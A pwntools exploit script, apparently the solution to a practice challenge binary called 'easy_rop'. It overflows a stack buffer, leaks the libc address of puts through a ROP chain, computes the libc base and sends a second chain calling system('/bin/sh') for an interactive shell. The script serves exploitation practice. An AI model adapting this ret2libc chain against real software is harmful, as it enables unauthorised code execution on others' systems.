#!/usr/bin/python3
from pwn import *

context.binary = binary = ELF('easy_rop')

r = ROP(binary)

p = process(binary.path)

# context.terminal = ['termite', '-e']
# gdb.attach(p, 'c')

pattern = cyclic(0x20)

# leak puts location in libc, plus a newline because of puts.
r.call('plt.puts', [r.resolve('got.puts')])
# call vuln again so that a second ropchain can be sent
r.call('vuln')

print("first chain:")
print(r.dump())

# length of the buffer + size_t (for rbp), then chain
inp = pattern + b'J'*8 + r.chain()

p.sendlineafter(b'?\n', inp)

leak = u64(p.readline().strip().ljust(8, b'\x00'))
log.info("leaked address of puts: %s", hex(leak))

lib = ELF('/usr/lib/libc.so.6')
lib.address = leak - lib.sym['puts']

log.info('libc base address: %s', hex(lib.address))
binsh_address = lib.data.find(b'/bin/sh') + lib.address
log.info("address of '/bin/sh' in libc: %s", binsh_address)

r2 = ROP(lib)
r2.system(binsh_address)

p.sendline(pattern + b'J'*8 + r2.chain())
p.interactive()

